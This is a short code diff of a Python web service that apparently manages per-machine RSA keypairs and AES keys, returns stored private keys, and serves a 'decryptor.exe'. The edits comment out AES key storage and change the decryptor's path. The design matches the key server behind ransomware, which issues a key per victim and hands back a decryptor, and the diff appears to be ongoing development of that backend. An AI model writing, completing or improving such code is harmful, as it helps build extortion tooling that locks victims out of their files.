@@ -50,7 +50,7 @@ def add_aes_key(key_info: AddAES):
         ).first()
 
         if existing:
-            existing.aes_key = key_info.aes_key
+            # existing.aes_key = key_info.aes_key
             existing.content = key_info.content or ""
             db.commit()
             db.refresh(existing)
@@ -85,7 +85,7 @@ def get_keys():
                     "machine_id": k.machine_id,
                     "public_key": k.public_key,
                     "private_key": k.private_key,
-                    "aes_key": k.aes_key,
+                    # "aes_key": k.aes_key,
                     "content": k.content or ""
                 }
                 for k in keys
@@ -111,7 +111,7 @@ def get_public_key(payload: MachineId):
                 public_key=key.publickey().export_key().decode(),
                 private_key=key.export_key().decode(),
                 machine_id=payload.machine_id,
-                aes_key=None,
+                # aes_key=None,
                 content=""
             )
 
@@ -134,7 +134,7 @@ def get_private_key(machine_id: str):
 
     db = SessionLocal()
 
-    exe_path = "decryptor.exe"
+    exe_path = "dist/decryptor.exe"
 
     try:
         existing = db.query(Keys).filter(
